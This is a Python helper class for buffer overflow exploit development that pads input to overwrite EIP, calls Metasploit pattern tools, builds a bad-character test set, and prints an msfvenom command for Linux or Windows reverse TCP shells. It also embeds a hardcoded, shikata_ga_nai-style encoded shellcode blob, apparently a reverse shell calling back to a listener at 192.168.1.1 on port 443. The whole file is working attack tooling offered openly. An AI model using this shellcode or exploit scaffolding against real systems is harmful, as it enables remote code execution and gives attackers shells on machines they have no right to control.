import subprocess


class MyDefinitions:

    def __init__(self, RHOST, RPORT, eip_offset=0, eip_post=0, bad_chars=[], eip_overwrite="", LHOST="192.168.1.1",
                 LPORT=443):
        self.RHOST = RHOST
        self.RPORT = RPORT
        self.eip_offset = ("A" * eip_offset).encode()
        self.eip_mark = ("B" * 4).encode()
        self.eip_post = ("C" * eip_post).encode()
        self.bad_chars = (["\x00"] + bad_chars)
        self.eip_overwrite = eip_overwrite.encode("raw_unicode_escape")
        self.nop_sled = ("\x90" * 12).encode("raw_unicode_escape")
        self.LHOST = LHOST
        self.LPORT = LPORT

    def filler(self, fillerSize=10):
        return ("A" * fillerSize).encode()

    def create_pattern(self, patternSize):
        print(f"Creating a pattern of size {patternSize}")
        out = subprocess.Popen(["msf-pattern_create", "-l", f"{patternSize}"], stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)
        stdout, stderr = out.communicate()
        if stderr:
            print(stderr)
        else:
            return stdout

    def find_offset_by_pattern(self, patternSize, pattern):
        out = subprocess.Popen(["msf-pattern_offset", "-l", f"{patternSize}", "-q", f"{pattern}"],
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout, stderr = out.communicate()
        if stderr:
            print(stderr)
        else:
            return stdout

    def find_bad_chars(self):
        full_char_set = ('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F'
                         '\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F'
                         '\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F'
                         '\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F'
                         '\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F'
                         '\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F'
                         '\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F'
                         '\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F'
                         '\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F'
                         '\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F'
                         '\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF'
                         '\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF'
                         '\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF'
                         '\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF'
                         '\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF'
                         '\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF')
        good_char_set = full_char_set
        for i, bc in enumerate(self.bad_chars):
            good_char_set = good_char_set.replace(self.bad_chars[i], '')
        return good_char_set.encode("raw_unicode_escape")

    def make_the_shell(self, shell_type):
        shell = ''
        if shell_type == 1:
            shell = 'linux/x86/shell_reverse_tcp'
        elif shell_type == 2:
            shell = 'windows/shell_reverse_tcp'

        print(self.bad_chars)
        print(
            f"msfvenom -p {shell} LHOST={self.LHOST} LPORT={self.LPORT} -f c -e x86/shikata_ga_nai\
             -b {''.join(self.bad_chars)}")

    def the_shell(self):
        shell = ("\xb8\xba\xef\x58\xa8\xda\xcc\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
                 "\x52\x31\x43\x12\x83\xeb\xfc\x03\xf9\xe1\xba\x5d\x01\x15\xb8"
                 "\x9e\xf9\xe6\xdd\x17\x1c\xd7\xdd\x4c\x55\x48\xee\x07\x3b\x65"
                 "\x85\x4a\xaf\xfe\xeb\x42\xc0\xb7\x46\xb5\xef\x48\xfa\x85\x6e"
                 "\xcb\x01\xda\x50\xf2\xc9\x2f\x91\x33\x37\xdd\xc3\xec\x33\x70"
                 "\xf3\x99\x0e\x49\x78\xd1\x9f\xc9\x9d\xa2\x9e\xf8\x30\xb8\xf8"
                 "\xda\xb3\x6d\x71\x53\xab\x72\xbc\x2d\x40\x40\x4a\xac\x80\x98"
                 "\xb3\x03\xed\x14\x46\x5d\x2a\x92\xb9\x28\x42\xe0\x44\x2b\x91"
                 "\x9a\x92\xbe\x01\x3c\x50\x18\xed\xbc\xb5\xff\x66\xb2\x72\x8b"
                 "\x20\xd7\x85\x58\x5b\xe3\x0e\x5f\x8b\x65\x54\x44\x0f\x2d\x0e"
                 "\xe5\x16\x8b\xe1\x1a\x48\x74\x5d\xbf\x03\x99\x8a\xb2\x4e\xf6"
                 "\x7f\xff\x70\x06\xe8\x88\x03\x34\xb7\x22\x8b\x74\x30\xed\x4c"
                 "\x7a\x6b\x49\xc2\x85\x94\xaa\xcb\x41\xc0\xfa\x63\x63\x69\x91"
                 "\x73\x8c\xbc\x36\x23\x22\x6f\xf7\x93\x82\xdf\x9f\xf9\x0c\x3f"
                 "\xbf\x02\xc7\x28\x2a\xf9\x80\x5c\xbb\x04\x21\x09\xb9\x06\xc0"
                 "\x72\x34\xe0\xa8\x94\x11\xbb\x44\x0c\x38\x37\xf4\xd1\x96\x32"
                 "\x36\x59\x15\xc3\xf9\xaa\x50\xd7\x6e\x5b\x2f\x85\x39\x64\x85"
                 "\xa1\xa6\xf7\x42\x31\xa0\xeb\xdc\x66\xe5\xda\x14\xe2\x1b\x44"
                 "\x8f\x10\xe6\x10\xe8\x90\x3d\xe1\xf7\x19\xb3\x5d\xdc\x09\x0d"
                 "\x5d\x58\x7d\xc1\x08\x36\x2b\xa7\xe2\xf8\x85\x71\x58\x53\x41"
                 "\x07\x92\x64\x17\x08\xff\x12\xf7\xb9\x56\x63\x08\x75\x3f\x63"
                 "\x71\x6b\xdf\x8c\xa8\x2f\xef\xc6\xf0\x06\x78\x8f\x61\x1b\xe5"
                 "\x30\x5c\x58\x10\xb3\x54\x21\xe7\xab\x1d\x24\xa3\x6b\xce\x54"
                 "\xbc\x19\xf0\xcb\xbd\x0b").encode("raw_unicode_escape")

        return shell
